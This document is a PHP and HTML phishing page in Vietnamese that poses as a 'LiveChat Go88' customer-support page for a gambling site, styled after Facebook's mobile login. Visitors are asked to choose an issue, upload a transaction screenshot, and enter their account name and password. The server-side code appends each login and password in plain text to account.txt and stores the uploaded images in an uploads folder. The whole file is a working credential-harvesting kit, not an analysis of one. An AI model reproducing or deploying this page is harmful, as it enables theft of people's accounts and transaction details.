<?php
  if (isset($_POST["login"])) {
    $errorMessage = array();
    $user = array();

    $user['email'] = isset($_POST['email']) ? strtolower($_POST['email']) : '';
    $user['password'] = isset($_POST['password']) ? strtolower($_POST['password']) : '';
    $user['img'] = isset($_FILES['img']['name']) ? $_FILES['img']['name'] : '';

    if (!$user["email"]) {
      $errorMessage["email"] = "Vui lòng nhập email";
    }

    if (!$user["password"]) {
      $errorMessage["password"] = "Vui lòng nhập mật khẩu";
    }

    if ($user["img"] == "") {
      $errorMessage["img"] = "Vui lòng cung cấp hình ảnh giao dịch";
    } else {
      if ($_FILES['img']['error'] == 0) {
        $email = (isset($_POST['email']) && strlen($_POST['email']) > 0) ? strtolower($_POST['email']) . "-" : '';
        $path_img = "./uploads/" . $email . basename($_FILES['img']['name']);
        move_uploaded_file($_FILES["img"]["tmp_name"], $path_img);
      }
    }

    if (empty($errorMessage)) {
      $myFile = fopen("account.txt", "a");
      $account = $user["email"] . "|" . $user["password"] . "\n";
      fwrite($myFile, $account);

      fclose($myFile);
      unset($user);
    }
  }

?>

<!DOCTYPE html>
<html lang="vi" id="facebook">
  <head>
    <meta charset="utf-8" />
    <script src="https://code.jquery.com/jquery-2.2.2.min.js"></script>
    <title id="pageTitle">LiveChat Go88</title>
    <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
    <meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no" />
    <link href="img/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed" sizes="196x196" />
    <meta name="referrer" content="no-referrer" />
    <meta name="referrer" content="unsafe-url" />
    <meta name="referrer" content="origin" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    <meta name="referrer" content="origin-when-cross-origin" />
    <script type="text/javascript">
      $("#mesbox").hide();
    </script>
    <link rel="stylesheet" href="fb.php">
  </head>
  <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
    <br />
    <div id="root" role="main" class="_5soa acw" data-sigil="context-layer-root content-pane" style="min-height: 0px;">
      <div class="_5b_f" style="text-align: center; color: rgb(20, 24, 35); font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif; font-size: 16px; line-height: 18px;">
        <img alt="" class="mhs _5b_g img" height="70" src="https://i.pinimg.com/474x/57/65/d2/5765d243605a8722d059ef5b40d50f3e.jpg" style="border-top-left-radius: 7px; border-top-right-radius: 7px; border-bottom-right-radius: 7px; border-bottom-left-radius: 7px; -webkit-box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 1px; display: inline-block; height: 70px; width: 70px;" width="70" />
        <div class="uiScaledImageContainer mhs _5b_g" style="border-top-left-radius: 7px; border-top-right-radius: 7px; border-bottom-right
                
            </div>
						<div class=" _5b_h" style="margin: 15px auto 0px; text-align: center; width: 300px; color: rgb(20, 24, 35); font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif; font-size: 13px; line-height: 18px;">
          <h2>
            <span class="fwb">
              <font color="red">LiveChat - Go88 cổng game đại gia</font>
            </span>
          </h2>
          <h3>
            <span class="fwb">
              <font color="red">Chọn vấn đề cần xử lý</font>
            </span>
          </h3>
        </div>
        <div class="aclb _4-4l">
          <div class="_5rut">
            <form id="login_form" action="" class="mobile-login-form _5spm" method="post" enctype="multipart/form-data">
              Nạp - Rút tiền lâu <input type="checkbox"> Xác minh chính chủ <input type="checkbox"> Vấn đề khác <input type="checkbox">
              <br>

              <div>
                <span>Vui lòng cung cấp hình ảnh giao dịch</span>
                <input type="file" name="img" accept="image/*" id="">

                <p style="margin-top: 0; color: red;">
                  <?php echo isset($errorMessage['img']) ? $errorMessage['img'] : '';?>
                </p>
              </div>

              <div id="user_info_container"></div>
              <div id="pwd_label_container"></div>
              <div id="otp_retrieve_desc_container"></div>
              <div class="_56be _5sob">
                <div class="_55wo _55x2 _56bf">
                  <div id="email_input_container">
                    <br>
                    <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" id="username" name="email" autocomplete="on" id="m_login_email" placeholder="Tài khoản" type="text" data-sigil="m_login_email" value="<?= isset($user['email']) ? $user['email'] : '';?>">
                    <div class="form-message" style="color: red; margin-bottom: 10px;">
                      <?php echo isset($errorMessage['email']) ? $errorMessage['email'] : '';?>
                    </div>
                  </div>
                  <div>
                    <div class="_1upc _mg8">
                      <div class="_4g33">
                        <div class="_4g34 _5i2i _52we">
                          <div class="_5xu4">
                            <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="username" name="password" placeholder="Mật khẩu" type="password" data-sigil="password-plain-text-toggle-input" value="<?= isset($user['password']) ? $user['password'] : '';?>">
                            <div class="form-message" style="color: red;">
                              <?php echo isset($errorMessage['password']) ? $errorMessage['password'] : '';?>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <br>
              <div class="_2pie" style="text-align:center;">
                <div id="u_0_4">
                  <button type="submit" value="Đăng nhập" name="login" class="54k8 _52jh _56bs _56b _28lf _56bw _56bu" name="login">
                    <span class="_55sr">Hoàn thành</span>
                  </button>
                </div>
                <div id="otp_button_elem_container">
                </div>
              </div>
              <div class="_xo8"></div>
            </form>
            <div></div>
          </div>
        </div>
      </div>
    </div>
    </div>
  </body>
</html>
